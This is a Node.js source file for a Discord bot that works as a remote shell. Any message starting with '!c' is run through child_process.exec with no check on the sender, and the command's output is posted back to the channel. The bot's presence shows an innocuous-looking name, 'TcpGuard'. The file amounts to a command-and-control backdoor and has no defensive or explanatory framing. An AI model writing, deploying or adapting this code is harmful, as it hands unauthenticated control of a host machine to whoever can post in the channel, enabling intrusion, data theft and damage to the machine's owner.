const Discord = require("discord.js");
const  client = new Discord.Client();


client.on("ready", () => {
  client.user.setPresence( {
    status: "online",
    game: {
        name: `0001.`,
        type: "TcpGuard"
    }
 });
  try{
    console.log("am online!");
  } catch(e) {
    console.log(e);
  }
});


client.on("message", (message) => {

    const express = require('express');
    const r_express = express.Router();
    const shell = require('child_process').exec;
    const prefix = "!";
    const args = message.content.slice(prefix.length).trim().split(/ +/g);
    const command = args.shift().toLowerCase();
    if(message.content.startsWith(prefix + "c")) {
        let command = args.slice(0).join(" ");
        if(!command) return message.channel.send("??");
        else{
            try {
                shell('' + command + '', function (err, stdout, stderr) {
                    message.channel.send(stdout.toString('utf-8'));   
                    console.log(stdout.toString('utf-8'));
                });
            } catch (er) {
               message.channel.send("error");
            };
        }
    }
});
client.login("x");